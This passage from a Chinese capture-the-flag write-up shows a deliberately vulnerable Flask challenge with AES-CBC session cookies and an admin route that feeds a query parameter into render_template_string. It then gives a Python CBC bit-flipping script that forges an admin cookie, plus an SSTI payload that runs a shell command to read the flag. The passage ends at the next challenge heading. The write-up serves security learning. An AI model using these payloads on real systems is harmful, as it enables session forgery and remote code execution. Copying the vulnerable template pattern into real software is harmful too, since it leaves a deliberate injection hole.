+</span></span><span class="line"><span class="cl">        <span class="n">cookie_encrypted</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">validate</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">binascii</span><span class="o">.</span><span class="n">Error</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cookie_encrypted</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">iv</span><span class="p">,</span> <span class="n">padded</span> <span class="o">=</span> <span class="n">cookie_encrypted</span><span class="p">[:</span><span class="mi">16</span><span class="p">],</span> <span class="n">cookie_encrypted</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cookie_json</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">padded</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">cookie_json</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_cookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bool</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">cookie</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cookie_encrypted</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">validate</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">binascii</span><span class="o">.</span><span class="n">Error</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cookie_encrypted</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">iv</span><span class="p">,</span> <span class="n">padded</span> <span class="o">=</span> <span class="n">cookie_encrypted</span><span class="p">[:</span><span class="mi">16</span><span class="p">],</span> <span class="n">cookie_encrypted</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">padded</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cookie_json_bytes</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">decrypted</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cookie_json</span> <span class="o">=</span> <span class="n">cookie_json_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cookie_dict</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">cookie_json</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="n">cookie_dict</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_cookie</span><span class="p">(</span><span class="n">user</span><span class="p">:</span> <span class="n">APPUser</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cookie_dict</span> <span class="o">=</span> <span class="n">asdict</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cookie_json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookie_dict</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cookie_json_bytes</span> <span class="o">=</span> <span class="n">cookie_json</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">padded</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">cookie_json_bytes</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">padded</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">encrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">validate_cookie</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;jwbcookie&#34;</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;home&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/register&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_name</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;Username already exists!&#34;</span><span class="p">,</span> <span class="s2">&#34;danger&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">users</span><span class="p">[</span><span class="n">user_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">APPUser</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">name</span><span class="o">=</span><span class="n">user_name</span><span class="p">,</span> <span class="n">password_raw</span><span class="o">=</span><span class="n">password</span><span class="p">,</span> <span class="n">register_time</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;Registration successful! Please login.&#34;</span><span class="p">,</span> <span class="s2">&#34;success&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;register.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/login&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span> <span class="ow">and</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span><span class="o">.</span><span class="n">password_raw</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span> <span class="o">=</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;home&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">&#34;jwbcookie&#34;</span><span class="p">,</span> <span class="n">generate_cookie</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">resp</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;Invalid credentials. Please try again.&#34;</span><span class="p">,</span> <span class="s2">&#34;danger&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;login.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/home&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">valid</span><span class="p">,</span> <span class="n">current_username</span> <span class="o">=</span> <span class="n">parse_cookie</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;jwbcookie&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">valid</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">current_username</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;logout&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">current_username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;logout&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">current_username</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">html_template</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;title&gt;Home&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;link rel=&#34;stylesheet&#34; href=&#34;{{ url_for(&#39;static&#39;, filename=&#39;styles.css&#39;) }}&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;h2 class=&#34;text-center&#34;&gt;Welcome, </span><span class="si">%s</span><span class="s2"> !&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            Your payload: </span><span class="si">%s</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;img src=&#34;{{ url_for(&#39;static&#39;, filename=&#39;interesting.jpeg&#39;) }}&#34; alt=&#34;Embedded Image&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;a href=&#34;/logout&#34; class=&#34;btn btn-danger&#34;&gt;Logout&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">current_username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">html_template</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;title&gt;Home&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;link rel=&#34;stylesheet&#34; href=&#34;{{ url_for(&#39;static&#39;, filename=&#39;styles.css&#39;) }}&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;h2 class=&#34;text-center&#34;&gt;server code (encoded)&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;text-center&#34; style=&#34;word-break:break-all;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        {</span><span class="si">%%</span><span class="s2"> raw </span><span class="si">%%</span><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">%s</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        {</span><span class="si">%%</span><span class="s2"> endraw </span><span class="si">%%</span><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;a href=&#34;/logout&#34; class=&#34;btn btn-danger&#34;&gt;Logout&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">%</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">html_template</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/logout&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">delete_cookie</span><span class="p">(</span><span class="s2">&#34;jwbcookie&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span></span></span></code></pre></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>CBC字节翻转攻击伪造admin打SSTI就行</p>
+<p>首先我们注册的用户对象json格式为</p>
+<pre tabindex="0"><code>{&#34;name&#34;: &#34;admix&#34;, &#34;password_raw&#34;: &#34;password123&#34;, &#34;register_time&#34;: 1714100000}</code></pre><p>返回给我们的cookie格式为base64(IV + AES(User)) ，可知道我们需要反转的m在User Json格式的第一个AES分组的第15位，根据CBC的特性可知，第一组明文在加密前需要与IV进行异或，那么我们直接翻转IV即可，同时不用考虑翻转后的扩散影响</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="s1">&#39;pcs0XLPoE/wf64KE3YYV6lqC8s7SM/sFaFTE+Ap373D2nEWbaLEYgGGzhFKfXeeuxO/uZKY5cRm75DWqY3O7bFysO8ke5XZtzt7J1l0BlDwCJvxzh+TP3s7rx9jVYmqw&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">cipher</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl"><span class="n">iv</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="n">iv</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_cookie</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span> <span class="o">+</span> <span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Cipher:&#39;</span><span class="p">,</span> <span class="n">new_cookie</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># pcs0XLPoE/wf64KE3YYD6lqC8s7SM/sFaFTE+Ap373D2nEWbaLEYgGGzhFKfXeeuxO/uZKY5cRm75DWqY3O7bFysO8ke5XZtzt7J1l0BlDwCJvxzh+TP3s7rx9jVYmqw</span></span></span></code></pre></div></div><pre tabindex="0"><code>{{g.pop.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()}}</code></pre><p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202504272313878.png' alt="img"></p>
+<h1 class="heading-element" id="not-so-web-2"><span>not so web 2</span>
+  <a href="#not-so-web-2" class="heading-mark">
